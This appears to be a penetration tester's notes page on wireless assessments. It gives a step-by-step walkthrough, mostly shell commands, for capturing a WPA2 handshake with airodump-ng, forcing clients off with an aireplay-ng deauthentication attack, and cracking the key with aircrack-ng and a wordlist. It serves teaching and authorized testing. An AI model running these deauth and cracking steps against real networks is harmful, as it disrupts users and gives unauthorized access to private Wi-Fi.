# Wireless PT

## Assessment of wireless network Types

* WPA2 PSK (Personal, small network)
* WPA2 Enterprise&#x20;



## Activites Performed

* Evaluating strength of PSK
* Reviewing nearby networks
* Assessing guest networks
* Checking network access



## Tools being used

* Wireless card (ex Alfa AWUS 036NH)
* Router (ex tp-link AC2300 Wireless)
* Laptop



## Methodology

<figure><img src="../../.gitbook/assets/Screenshot 2025-08-23 at 16.35.12.png" alt=""><figcaption></figcaption></figure>



## WPA PS2 Exploit

1. Connect the Wireless card to our Laptop and check if it's connected

```
iwconfig 
```

<figure><img src="../../.gitbook/assets/Screenshot 2025-08-23 at 16.39.47.png" alt=""><figcaption></figcaption></figure>

2. Setting up the wireless card to monitor networks

Before doing that, kill other process still running

```
airmon-ng check kill
```

Then, start the monitor with `airmon-ng` tool

```
airmon-ng start wlan0
```

Check the monitor interface with this command

```
iwconfig
```

<figure><img src="../../.gitbook/assets/Screenshot 2025-08-23 at 16.47.33.png" alt=""><figcaption></figcaption></figure>



3. Search for nearby networks using `airodump-ng` tool and the monitor interface

```bash
airodump-ng wlan0mon
```

<figure><img src="../../.gitbook/assets/Screenshot 2025-08-23 at 22.43.04.png" alt=""><figcaption></figcaption></figure>

* `BSSID`: MAC address of the access point
* `PWR`: less number equal that the AP is get close.
* `CH`: channel of the AP



4. Get the devices connected to the AP with the following command

```bash
airodump-ng -c 6 --bssid <MAC> -w capture wlan0mon
```

<figure><img src="../../.gitbook/assets/Screenshot 2025-08-23 at 23.10.50.png" alt=""><figcaption></figcaption></figure>

* `STATION`: is the MAC address of connected devices to the AP



5. Open new terminal, copy a MAC address of a connected device from the STATION column of the previous command and then **perform a Deauth Attack** to capture the Handshake with follow command.

```bash
aireplay-ng -0 1 -a <AP_MAC_ADDRESS> -c <CLIENT_MAC_ADDRESS> wlan0mon
```

* `-0`: specify the deuath attack
* `1`: how much time repeat the attack
* `-a`: specify the ap mac address
* `-c`: specify the client device mac address took from STATION column

<figure><img src="../../.gitbook/assets/Screenshot 2025-08-23 at 23.29.12.png" alt=""><figcaption></figcaption></figure>



6. Wait that the airodump-ng command **capture the WPA Handshake**, when the client device will reconnect to the AP.

<figure><img src="../../.gitbook/assets/Screenshot 2025-08-23 at 23.41.16.png" alt=""><figcaption></figcaption></figure>

The handshake will store in capture file in the current directory

<figure><img src="../../.gitbook/assets/Screenshot 2025-08-23 at 23.44.20.png" alt=""><figcaption></figcaption></figure>

7. Use `aircrack-ng` to cracking the handshake from the capture file.

```bash
aircrack-ng -w /PATH/TO/wordlist.txt -b <BSSID_AP> CAPTURE_FILE.cap
```

<figure><img src="../../.gitbook/assets/Screenshot 2025-08-23 at 23.47.34 (1).png" alt=""><figcaption></figcaption></figure>
